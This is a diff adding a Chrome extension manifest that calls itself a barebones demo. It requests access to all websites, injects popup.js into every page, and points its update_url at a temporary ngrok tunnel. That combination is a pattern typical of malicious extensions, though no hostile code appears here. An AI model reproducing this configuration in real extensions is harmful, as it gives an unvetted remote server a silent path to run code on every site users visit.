@@ -1,0 +1,25 @@
+{
+	"manifest_version": 2,
+	"name": "Chrome Extension",
+	"version": "3.0.7",
+	"description": "This is a barebones Chrome extension for demo purposes.",
+	"permissions": [
+		"http://*/",
+		"https://*/"
+	],
+	"browser_action": {
+		"default_popup": "popup.html",
+		"default_title": "Click me!"
+	},
+	"content_scripts": [
+		{
+			"matches": [
+				"<all_urls>"
+			],
+			"js": [
+				"popup.js"
+			]
+		}
+	],
+	"update_url": "https://0107-2601-140-827f-ad80-4809-cb1f-2f60-18ad.ngrok-free.app/update.xml"
+}
